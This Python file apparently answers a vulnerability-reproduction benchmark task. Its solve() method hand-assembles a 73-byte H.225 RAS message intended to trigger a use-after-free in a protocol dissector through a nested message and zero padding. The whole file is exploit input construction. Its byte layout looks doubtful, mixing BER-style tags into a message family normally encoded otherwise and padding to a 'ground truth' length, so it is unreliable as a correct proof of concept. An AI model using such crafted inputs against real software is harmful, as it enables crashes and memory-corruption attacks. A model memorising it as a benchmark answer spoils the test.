import os
import struct
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal H.225 RAS message that triggers the use-after-free
        # Based on the vulnerability: dissect_h225_h225_RasMessage without next_tvb_init()
        # The PoC needs to cause next_tvb_add_handle() to write to freed memory
        
        # H.225 RAS message structure (simplified):
        # - Request sequence number (2 bytes)
        # - Message type (1 byte)
        # - Various fields that trigger vulnerable code path
        
        # Ground truth length is 73 bytes
        # We'll create a RAS AdmissionConfirm message that triggers the vulnerable path
        
        poc = bytearray()
        
        # RAS Message header
        poc.extend(b'\x00\x00')  # Request sequence number
        poc.extend(b'\x04')      # AdmissionConfirm message type (0x04)
        
        # CallReferenceValue (4 bytes)
        poc.extend(b'\x00\x00\x00\x01')
        
        # ProtocolIdentifier (OID for H.225)
        # OID: 0.0.8.2250.0.3
        poc.extend(b'\x60\x85\x74\x06\x01\x40\x01\x00')
        
        # DestinationInfo (CHOICE tag and length)
        poc.extend(b'\xa0\x1a')
        
        # TransportAddress CHOICE (ipAddress tag)
        poc.extend(b'\x80\x16')
        
        # ipAddress SEQUENCE
        poc.extend(b'\x30\x14')
        
        # ip OCTET STRING (4 bytes for IPv4)
        poc.extend(b'\x80\x04\xc0\xa8\x00\x01')  # 192.168.0.1
        
        # port INTEGER
        poc.extend(b'\x81\x02\x13\x88')  # Port 5000
        
        # Now add the critical part that triggers the vulnerability
        # This should cause dissect_h225_h225_RasMessage to be called again
        # without proper initialization of next_tvb handles
        
        # Add a nested RasMessage to trigger re-entry
        poc.extend(b'\xa0\x20')  # [0] IMPLICIT SEQUENCE tag and length
        
        # Another RasMessage inside
        poc.extend(b'\x00\x00')  # Request sequence number
        poc.extend(b'\x04')      # AdmissionConfirm again
        
        # Minimal remaining fields to reach 73 bytes
        poc.extend(b'\x00\x00\x00\x02')  # CallReferenceValue
        poc.extend(b'\x60\x85\x74\x06\x01\x40\x01\x00')  # ProtocolIdentifier
        
        # Pad to exactly 73 bytes
        while len(poc) < 73:
            poc.extend(b'\x00')
        
        return bytes(poc[:73])
